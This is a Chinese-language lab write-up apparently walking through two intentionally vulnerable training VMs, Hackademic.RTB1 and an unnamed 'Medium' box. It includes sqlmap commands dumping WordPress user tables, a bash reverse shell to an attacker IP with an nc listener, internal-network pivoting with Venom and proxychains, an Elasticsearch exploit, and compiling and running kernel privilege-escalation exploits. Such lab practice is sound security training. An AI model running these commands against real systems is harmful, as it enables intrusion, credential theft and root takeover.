靶机练习

2024-01-12

Hackademic.RTB1, Medium

Hackademic.RTB1

准备靶机

下载Hackademic.RTB1，用VMware打开。

点击设置，将网络适配器改成NAT，点击高级

扫描

打开kali,打开终端，输入arp-scan -l -I eth1

找不到靶机地址，重启靶机，生成新的MAC地址。

多出一个地址，说明是靶机。发现ip192.168.46.138

nmap -sS 192.168.46.138 -A发现两个端口

在火狐输入IP和80端口发现

通过此命令查看DC1的全端口信息：nmap -p- 192.168.17.133

确定版本：nmap -p 80 -sV 192.168.46.138

dirsearch -u 192.168.46.138 -x 403，404 -t 50

在页面到处跳转，发现有3个页面有参数值，每个页面试试之后发现，cat页面。

利用sqlmap爆出数据,

sqlmap -u “192.168.46.138/Hackademic_RTB1/?cat=1” –dbs

sqlmap -u “192.168.46.138/Hackademic_RTB1/?cat=1” –current-db

爆出当前数据库wordpress

爆表sqlmap -u “192.168.46.138/Hackademic_RTB1/?cat=1” -D wordpress –tables

dump打印输出表名指定列名字段的值数据， -C 指定需要显示数值的字段名，不指定默认显示全部字段，

sqlmap -u “192.168.46.138/Hackademic_RTB1/?cat=1” -D wordpress -T wp_users –dump

根据信息可知密码列为user_pass,用户名 user_firstname+user_lastname找到了登录页面GeorgeMiller:q1w2e3

进入后台

写马

蚁剑连接

反向 shell 连接监听

bash -i >& /dev/tcp/192.168.46.131/4444 0>&1
nc -lvvp 4444

提升权限

python -c ‘import pty; pty.spawn(“/bin/bash”)’
ctrl +z
stty raw -echo;fg;reset

查看内核版本uname -a

漏洞搜索

searchsploit 2.6.3|grep Local

searchsploit 2.6.3|grep Local |grep rc8

拷贝文件cp /usr/share/exploitdb/exploits/linux/local/15285.c ./

将文件拖入蚁剑

nc -lvvp 4444

uname -a

cd /tmp

gcc -o exp 15285.c

chmod 777 exp

./exp

cat /root/key.txt

查看权限

id,whoami

拿取最终的flag

cd /root

ls

cat /root/key.txt

Medium

靶机导入virtualbox，设置查看MAC地址。

打开kali,打开终端，输入arp-scan -l -I eth0

端口扫描

dirseach扫描

在网站搜索IP

用浏览器访问http://192.168.56.103:5000，但在页面上并没有发现有用的信息

浏览器访问http://192.168.56.103:5000/admin，发现可以执行命令

反弹Shell

使用Python反弹shell

使用nc在Kali主机上监听TCP4444端口

在http://192.168.56.103:5000/admin输入Python Shell

发现收到Shell为docker主机的root权限

判断主机位Docker容器的两种方法 方法一:确认根目录下是否存在.dockerenv文件

方法二:查看/proc/1/cgroup是否存在docker目录

内网穿透

内网扫描

  • ip address 发现内网段为172.17.0.3/16网段
  • 内网主机扫描，发现172.17.0.1，172.17.0.2，172.17.0.3为存活主机

部署Venom内网穿透工具

在Kali主机Venom目录启动Python3 Http Server

启动Venom管理端，监听本地9999端口

靶机部署Venom客户端

在Kali主机Venom管理端可以看到有主机上线

查看、控制Venom节点、启动socks隧道

挂Socks内网扫描

修改proxychains配置

挂代理启动扫描，发现172.17.0.1，172.17.0.3相同，172.17.0.2存在9200端口

利用Elasticsearch获取目标靶机登录用户名和密码

搜索Elasticsearch漏洞

复制36337.py到当前目录，通过查看该python脚本得知该使用python2

向Elasticsearch写入一条数据（如果不写入数据，攻击代码无法执行）

挂proxychains攻击172.17.0.2 9200端口

查询用户身份,发现是root权限

在根目录下发现passwords文件，内含用户名一些用户名和密码

  1. 破解MD5加密明文(两种方法)
  • 方法一:使用Hashcat破解
  • 方法二:使用第三方密码查询平台（如：https://cmd5.com/）获取明文密码

通过依次尝试，john:1337hack可以登录目标靶机

Linux内核提权

尝试john用户提权，但提权失败

尝试内核提权

将编译好的exp和ofs-lib.so上传至目标靶机

kali主机在tmp目录启动http server
python3 -m http.server 80

在靶机上下载exp和ofs-lib.so

执行exp文件,提权成功
